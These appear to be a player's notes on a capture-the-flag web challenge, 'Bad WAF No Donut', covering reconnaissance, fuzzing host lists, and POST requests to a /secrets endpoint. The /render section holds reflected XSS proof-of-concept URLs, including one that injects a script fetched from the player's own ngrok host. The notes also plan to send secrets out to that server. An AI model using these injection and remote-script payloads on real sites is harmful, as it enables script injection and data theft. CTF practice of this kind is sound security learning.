# Bad WAF No Donut

> I made a simple little backdoor into my network to test some things. Let me know
> if you find any problems with it.
> https://nessus-badwaf.chals.io/

## Sitemap
/
/explore
  /books
  /cats
  /shopping_list
/render?url=https://google.com
/ping?host=google.com
/secrets (GET & POST)

## Open Questions
- How can we use /ping to get any external request made?
  - If ping can hit our server, will it actually run JS?
- Is the XSS necessary to get around cross-domains security?
  We could make a request to secrets and actually read the response as it executes
  on the same domain.

## Findings
- /explore reads an admin cookie and if true links to /secrets. Just go there or
  type `document.cookie="admin=true"` in console to get a link.
- /secrets has an HTML comment saying to try asking with a secret_name POST
  parameter. It seems likely to store the flag, but we "have to know how to ask"
  - Submitting `secret_name=flag` in a form responds with: "You know what to ask for, but you're not asking correctly."
    This is unique to form submssion and the name being flag. So seems like that right path.
- /render is vulnerable to XSS. This allows bypassing cross-domain restrictions.

## Exploit Paths
Clearly this is some sort of SSRF given the name and ability to render and ping.
The general idea is to figure out how to get ping to hit our server, but because
of WAF maybe this isn't allowed directly, but if we can then use render which
iframes our URL we might have custom code we can run to access LAN.

Possible: 
- Use /ping with /render to get an SSRF.
  - The SSRF can be through an iframe or XSS on the same domain
- Make request to /secrets locally and exfil to our server

## Notes
### POST /secrets
```
fetch("https://nessus-badwaf.chals.io/secrets", {method: "post", headers: {"Content-Type": "application/json"}, body: JSON.stringify({"secret_name": "secret"})})
// this one works
fetch("https://nessus-badwaf.chals.io/secrets", {method: "post", headers: {"Content-Type": "application/x-www-form-urlencoded"}, body: "secret_name=flag"})
```

- A basic POST returns a locked emoji, regardless of the payload content. So
  it's not clear if the format is right or not to even test against possible
  secret names.
- **When we form url encode it we get "You know what to ask for, but you're not
  asking correctly."**
  This ONLY happens when we use `secret_name=flag`. When we change the name of
  the key we get the locked emoji, when we change from `flag` we usually get 500
  errors.
  NOTE: This does not happen with `application/json` or `application/xml`
- Q: What does "correctly" mean?
  - Maybe this has to happen locally from a server iframe? It doesn't have CORS
    headers and this doesn't work in JS it seems. It can be done with a form on
    the page but we likely can't access contents of the redirect because of
    cross-frame things. BUT NOW WE CAN via XSS


### GET /ping?host=...
We want to try to get any ping on our server.


Fuzzed with these options and got nothing back. No variation in responses
either.
```
https://f2af-99-61-65-255.ngrok-free.app
//f2af-99-61-65-255.ngrok-free.app
f2af-99-61-65-255.ngrok-free.app
https://nessus-badwaf.chals.io/render?url=//f2af-99-61-65-255.ngrok-free.app
nessus-badwaf.chals.io/render?url=//f2af-99-61-65-255.ngrok-free.app
localhost/render?url=//f2af-99-61-65-255.ngrok-free.app
localhost:5000/render?url=//f2af-99-61-65-255.ngrok-free.app
localhost:8000/render?url=//f2af-99-61-65-255.ngrok-free.app
localhost:8080/render?url=//f2af-99-61-65-255.ngrok-free.app
localhost:9000/render?url=//f2af-99-61-65-255.ngrok-free.app
127.0.0.1/render?url=//f2af-99-61-65-255.ngrok-free.app
127.0.0.1:5000/render?url=//f2af-99-61-65-255.ngrok-free.app
127.0.0.1:8000/render?url=//f2af-99-61-65-255.ngrok-free.app
127.0.0.1:8080/render?url=//f2af-99-61-65-255.ngrok-free.app
127.0.0.1:9000/render?url=//f2af-99-61-65-255.ngrok-free.app
0.0.0.0:5000/render?url=//f2af-99-61-65-255.ngrok-free.app
0.0.0.0:8000/render?url=//f2af-99-61-65-255.ngrok-free.app
0.0.0.0:8080/render?url=//f2af-99-61-65-255.ngrok-free.app
0.0.0.0:9000/render?url=//f2af-99-61-65-255.ngrok-free.app
```

Hosts wordlist
```
https://nessus-badwaf.chals.io
//nessus-badwaf.chals.io
nessus-badwaf.chals.io
localhost
localhost:5000
http://localhost
http://localhost:5000
localhost.me
localhost.me:5000
http://localhost.me
http://localhost.me:5000
127.0.0.1
127.0.0.1:5000
http://127.0.0.1
http://127.0.0.1:5000
0.0.0.0
0.0.0.0:5000
http://0.0.0.0
http://0.0.0.0:5000

localhost:8000
localhost.me:8000
127.0.0.1:8000
0.0.0.0:8000
```

### GET /render?url=...
This URL renders whatevr we want into an iframe. This clearly looks like it's
used to render a malicious website that exfils something when we run it on ther
server.

I think you can just inject raw HTML and XSS because of inner html

```
"></iframe><div x="
```

POC:
https://nessus-badwaf.chals.io/render?url=%22%3E%3C/iframe%3E%3Cdiv%20x=%22

https://nessus-badwaf.chals.io/render?url=%22%3E%3C/iframe%3E%3Cimg%20src=%22https://f2af-99-61-65-255.ngrok-free.app/img.jpg%22/%3E%3Cdiv%20x=%22

Example requests
```
try loading an image to test if it can call out to us
https://nessus-badwaf.chals.io/render?url="></iframe><img src="//f2af-99-61-65-255.ngrok-free.app/img.jpg"/><div x="

inject our remote JS payload
https://nessus-badwaf.chals.io/render?url="></iframe><img src=x onerror="d=document;s=d.createElement('script');s.src='https://f2af-99-61-65-255.ngrok-free.app/script.js';d.head.appendChild(s)"/><div x="
```

